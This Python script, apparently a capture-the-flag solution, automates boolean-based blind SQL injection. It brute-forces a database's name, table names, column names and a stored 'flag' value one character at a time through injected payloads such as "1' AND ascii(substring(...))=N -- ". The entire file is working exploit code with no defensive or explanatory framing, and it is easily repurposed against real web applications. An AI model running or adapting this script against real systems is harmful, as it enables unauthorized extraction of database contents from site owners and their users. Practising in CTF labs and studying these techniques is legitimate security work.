import string

import requests
from utils import BASE_URL, HEADERS, VERIFY, send, charset

def get_database_length(max_length=20):
    print("[*] Finding db name length...")
    for length in range(1, max_length + 1):
        payload = f"1' and length(database())={length} -- "
        res = send(payload)
        if "1" in res:
            print(f"[+] Db name length: {length}")
            return length
    print("[-] Failed to detect length.")
    return None

# === Database name bruteforce ===
def extract_database_name(length=20):
    print("[*] Extracting database name...")
    db_name = ""
    for i in range(1, length + 1):
        for char in charset:
            payload = f"1' AND ascii(substring(database(),{i},1))={ord(char)} -- "
            res = send(payload)  # , proxies=PROXIES
            if "1" in res:
                db_name += char
                print(f"[+] Found char {i}: {char} --> {db_name}")
                break
        else:
            print(f"[-] No match found for position {i}")
            break
    print(f"\n🎯 Database name: {db_name}")
    return db_name


def extract_table_name(db_name, length=20):
    print(f"[*] Extracting table name from schema '{db_name}'...")
    table_name = ""
    for i in range(1, length + 1):
        for char in charset:
            payload = (
                f"1' AND ascii(substring(("
                f"SELECT table_name FROM information_schema.tables "
                f"WHERE table_schema='{db_name}' LIMIT 1 OFFSET 0"
                f"),{i},1))={ord(char)} -- "
            )
            res = send(payload)
            if "1" in res:
                table_name += char
                print(f"[+] Found char {i}: {char} --> {table_name}")
                break
        else:
            print(f"[-] No match for position {i}")
            break
    return table_name

def extract_column_name_by_offset(offset=0, length=20, table_name=""):
    print(f"[*] Extracting column name at offset {offset} from table '{table_name}'...")
    col_name = ""
    for i in range(1, length + 1):
        for char in charset:
            payload = (
                f"1' AND ascii(substring(("
                f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 1 OFFSET {offset}"
                f"),{i},1))={ord(char)} -- "
            )
            res = send(payload)
            if "1" in res:
                col_name += char
                print(f"[+] Found char {i}: {char} --> {col_name}")
                break
        else:
            print(f"[-] No match for position {i}")
            break
    return col_name

def extract_flag_value(length=60, col_name ="", table_name=""):
    print(f"[*] Extracting flag from '{col_name}' column...")
    flag = ""
    for i in range(1, length + 1):
        for char in charset:
            payload = (
                f"1' AND ascii(substring(("
                f"SELECT {col_name} FROM {table_name} LIMIT 1 OFFSET 0"
                f"),{i},1))={ord(char)} -- "
            )
            res = send(payload)
            if "1" in res:
                flag += char
                print(f"[+] Found char {i}: {char} --> {flag}")
                break
        else:
            print(f"[-] No match for position {i}. Ending.")
            break
    return flag

# if extracting flag failed , continue :
def extract_remained_flag_chars(length=50, col_name="", table_name="", known_prefix=""):
    flag = known_prefix
    for i in range(len(flag) + 1, length + 1):
        for char in charset:
            payload = (
                f"1' AND ascii(substring(("
                f"SELECT {col_name} FROM {table_name} LIMIT 1 OFFSET 0"
                f"),{i},1))={ord(char)} -- "
            )
            res = send(payload)
            if "1" in res:
                flag += char
                print(f"[+] Found char {i}: {char} --> {flag}")
                break
        else:
            print(f"[-] No match for position {i}. Ending.")
            break
    return flag